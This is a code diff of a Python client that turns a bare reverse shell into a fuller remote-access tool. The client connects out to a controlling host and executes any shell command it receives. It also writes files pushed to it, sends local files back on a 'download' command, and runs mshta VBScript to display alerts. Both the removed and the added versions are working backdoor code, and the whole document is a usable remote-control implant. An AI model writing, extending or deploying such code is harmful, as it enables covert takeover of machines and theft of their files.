@@ -1,39 +1,72 @@
-import os
-import socket
-import subprocess
-import sys
-
-s = socket.socket()
-host = '192.168.1.11'
-port = 9999
-s.connect((host, port))
+import os, socket, subprocess, sys
+from message import Message
 
 
-while True:
-    data = s.recv(1024) #1024 is buffer size
-    if data.decode("utf-8")[:2] == 'cd':
+class Client():
+    def __init__(self, shost, sport):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            os.chdir(data[3:].decode("utf-8"))
-            s.send('directory changed succesfully'.encode())
+            self.s.connect((shost, sport))
+            self.communicate()
         except:
-            s.send('error executing the command')
-    elif data.decode("utf-8") == 'quit':
-            sys.exit()
-    elif len(data) > 0:
-        cmd = subprocess.Popen(data.decode("utf-8"), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_bytes, "utf-8")
-        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-        print(output_str)
+            print('Failed to connect to host server')
 
 
-# while True:
-#     data = s.recv(1024)
-#     if data.decode("utf-8") == 'quit':
-#         sys.exit()
-#     print(data.decode("utf-8"))
-#     s.send(input('>>>').encode())
+    def receive(self):
+        msg = Message(self.s.recv(1024),2) #1024 is buffer size
+        size = msg.get_size()
+        print(size)
+        data = msg.utf
+        while len(data) < size:
+            data += Message(self.s.recv(1024),1).utf
+        return data
 
 
-# Close Connection
-s.close()
+    def receive_binary(self):
+        msg = Message(self.s.recv(1024),2) #1024 is buffer size
+        size = msg.get_size()
+        print(size)
+        data = msg.bin
+        while len(data) < size:
+            data += Message(self.s.recv(1024),1).bin
+            print(size - len(data), 'left')
+        return data
+
+
+    def save_file(self, name, content):
+        with open(name, 'wb') as file:
+            file.write(content)
+
+    def send_file(self,location):
+        with open(location, 'rb') as file:
+            return Message(file.read(), 1)
+
+    def communicate(self):
+        while True:
+            data = self.receive()
+            if data[:2] == 'cd':
+                try:
+                    os.chdir(data[3:])
+                    self.s.send(Message('directory changed succesfully\n'+str(os.getcwd()) + '> ',0).message)
+                except:
+                    self.s.send(Message('error executing the command',0).message)
+            elif data == 'quit':
+                    sys.exit()
+            elif data[:8] == 'incoming':
+                name = data[9:].strip()
+                content = self.receive_binary()
+                self.save_file(name, content)
+                self.s.send(Message('file received succesfully!', 0).message)
+            elif data[:8] == 'download':
+                location = data[9:]
+                print(location, 'is uploading')
+                self.s.send(self.send_file(location).message)
+            elif data[:5] == 'alert':
+                print('alert received')
+                alert_msg = data[6:]
+                os.system(f'''mshta vbscript:Execute("msgbox ""{alert_msg}"":close")''')
+            elif len(data) > 0:
+                cmd = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+                output = Message(cmd.stdout.read() + cmd.stderr.read(), 1)
+                print(output.utf)
+                self.s.send(Message(output.utf + str(os.getcwd()) + '> ', 0).message)
